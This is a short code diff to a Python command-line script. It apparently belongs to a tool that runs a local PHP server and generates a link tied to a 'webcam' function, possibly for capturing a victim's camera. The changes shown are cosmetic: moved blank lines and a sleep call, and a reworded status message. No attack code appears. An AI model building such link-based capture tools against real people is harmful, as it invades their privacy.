@@ -61,6 +61,7 @@ else:
             exit("\nWrong package installer name or python name !")
         except KeyboardInterrupt:
             exit("\n\nUser Exited :)")
+
 #Check sudo ====================================================================================================
 Tool.uid()   
 #Run localhost ====================================================================================================
@@ -77,8 +78,8 @@ def loaclhost():
 Tool.check_php()
 #Clear Page ====================================================================================================
 Tool.clear()
-sleep(0.1)
 
+sleep(0.1)
 #Banner ====================================================================================================
 Banner_color = (Fore.RED , Fore.MAGENTA , Fore.GREEN)
 rnd = random.choice(Banner_color)
@@ -125,7 +126,7 @@ def webcam():
 
     try:
         print(" ")
-        Tool.rotation(Fore.YELLOW + "please wait 10 second".title()  + Fore.RESET)
+        Tool.rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
     except KeyboardInterrupt:
         exit(f"""\n{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
